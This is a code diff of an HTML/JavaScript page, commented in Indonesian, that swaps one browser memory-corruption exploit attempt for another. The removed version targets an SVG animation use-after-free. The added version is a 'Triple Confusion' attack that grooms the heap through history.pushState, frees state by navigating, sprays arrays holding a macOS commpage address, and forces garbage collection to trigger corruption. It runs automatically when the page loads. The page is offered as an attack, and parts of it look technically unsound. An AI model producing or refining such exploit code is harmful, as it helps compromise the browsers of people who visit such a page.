@@ -1,35 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SVG Animation UAF (DOM Lifecycle)</title>
+    <title>Triple Confusion: XSLT/History/DOM Deserialization</title>
 </head>
 <body>
 
-    <h1>SVG Animation UAF (Final DOM Corruption)</h1>
+    <h1>Triple Confusion: Targeting Deserialization Logic</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan SVG Animation UAF...</p>
+    <p id="status">INIT: Mempersiapkan Serangan Deserialization...</p>
     <div id="log-area"></div>
 
-    <svg id="svg" width="500" height="500">
-        <filter id="f">
-            <feComponentTransfer>
-                <feFuncR id="victim" type="linear" slope="1" intercept="0">
-                    <animate attributeName="slope" to="0" dur="10s" id="anim"/>
-                </feFuncR>
-            </feComponentTransfer>
-        </filter>
-    </svg>
-    
     <script>
-        // ... (KONSTANTA COMM PAGE SAMA) ...
+        // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); 
+        
         const LOW_WORD_ADDR = Number(TARGET_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD_ADDR = Number(TARGET_ADDRESS >> 32n);
-        
-        // ... (FUNGSI LOG & SPRAY SAMA) ...
+
         let startTime = performance.now();
         let payloadHolders = []; 
+        let historyStates = []; 
+        let historyAttackerData = null;
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -38,59 +30,65 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
+        // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
-            log("Memulai Spraying Payload SINKRON (Targeting SVG Node/Pointer)...", "log-spray");
+            log("Memulai Spraying Payload SINKRON (Targeting Deserialization Buffer)...", "log-spray");
             const SPRAY_COUNT = 3000;
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
+                // Payload menimpa pointer data/metadata
                 payloadArray[0] = HIGH_WORD_ADDR; 
                 payloadArray[1] = LOW_WORD_ADDR;
                 payloadHolders.push(payloadArray); 
             }
         }
-        
+
         // --- FUNGSI UTAMA ATTACK ---
-        function runSVGAttack() {
+        function runTripleAttack() {
             startTime = performance.now();
-            log("Phase 1: Setup SVG Animation Object.", "log-init");
+            log("Phase 1: History Grooming dengan Data Kompleks.", "log-init");
 
-            const victim = document.getElementById('victim');
-            const anim = document.getElementById('anim');
+            const HISTORY_COUNT = 100;
             
-            // 1. FREE (Async): Pemicu Event Handler yang men-free node SVG
-            // Kita akan mengganti parent dari elemen 'victim' yang sedang dianimasikan.
-            victim.parentElement.removeChild(victim);
-            log("Phase 2: Victim SVG Node dihapus (FREE 1).", "log-critical");
-
-            // 2. SPRAY SINKRON: Menimpa lokasi memori node SVG yang di-free.
-            sprayPayload();
-            log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");
-
-            // 3. TRIGGER: Paksa Update C++ SVG Animation (Use After Free)
-            // Coba akses properti atau metode node yang sudah di-free.
+            // 1. Fragmentasi Heap dengan History State (Mengandung data yang sulit di-serialize)
+            for (let i = 0; i < HISTORY_COUNT; i++) {
+                // Gunakan DOM node, yang memaksa serialization yang kompleks
+                let div = document.createElement('div');
+                div.innerHTML = `<span id="node${i}">Complex Data...</span>`;
+                
+                // Simpan node DOM dalam state History
+                window.history.pushState({ id: i, data: div }, `State ${i}`, `#step${i}`);
+                historyStates.push(div);
+            }
+            log(`Phase 2: ${HISTORY_COUNT} History State DOM diserialisasi.`, "log-info");
             
+            // --- KONDISI KRITIS: FREE 1 & SPRAY ---
+
+            // 2. FREE 1: Kembali ke state awal (memaksa pembersihan 99 state)
+            window.history.go(-HISTORY_COUNT + 1);
+            log("Phase 3: Navigasi cepat (FREE 1 aktif).", "log-critical");
+
+            // 3. SPRAY SINKRON: Menimpa lokasi memori dari 99 state yang baru di-free.
+            sprayPayload(); 
+            log("Phase 4: SPRAY Commpage Payload SINKRON.", "log-critical");
+
+            // Hapus referensi JS
+            historyStates = null;
+            
+            // --- TRIGGER: FREE 2 / Deserialization Corruption ---
+
+            // 4. FREE 2 / Trigger: Navigasi cepat lagi
+            // Ini memaksa History Engine untuk men-deserialisasi objek yang sudah ditimpa
+            window.history.go(-1); 
+            log("Phase 5: Navigasi balik (FREE 2 / Trigger aktif).", "log-critical");
+
+            // 5. Trigger Implisit (Menunggu Deserialization crash)
             setTimeout(() => {
-                log("Phase 4: Memicu UAF Akses pada Animation Node...", "log-critical");
+                log("Menunggu Crash Deserialization (EXC_BAD_ACCESS/Arbitrary Read)...", "log-info");
                 
-                try {
-                    // Coba akses properti/metode node SVG yang sudah di-free.
-                    // Ini akan mencoba dereferensi pointer yang sudah ditimpa oleh spray (TARGET_ADDRESS)
-                    
-                    // Metode yang memaksa C++ dereference pointer (misalnya, memulai ulang animasi)
-                    anim.beginElement(); 
-                    
-                    // Coba akses properti read-write yang memaksa dereference node
-                    const test = victim.slope; 
-                    
-                    log(`Nilai slope (Diduga Corrupt) dibaca: ${test}`, "log-critical");
-
-                } catch(e) {
-                    log(`JS Exception: ${e.message} - Menunggu Crash OS (UAF/Arbitrary Read)...`, "log-critical");
-                }
-                
-                // Trigger tambahan: Paksa Garbage Collection
+                // Trigger GC agresif diakhir (memaksa cleanup)
                  for(let i = 0; i < 50; i++) {
                     new Array(1024 * 1024 * 5).fill(0xDEADBEEF);
                 }
@@ -98,9 +96,9 @@
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian SVG Animation UAF Attack...';
-            setTimeout(runSVGAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah DOM/SVG UAF.';
+            document.getElementById('status').textContent = 'Memulai rangkaian Triple Confusion Attack...';
+            setTimeout(runTripleAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Deserialization Corruption.';
         });
     </script>
     <style>
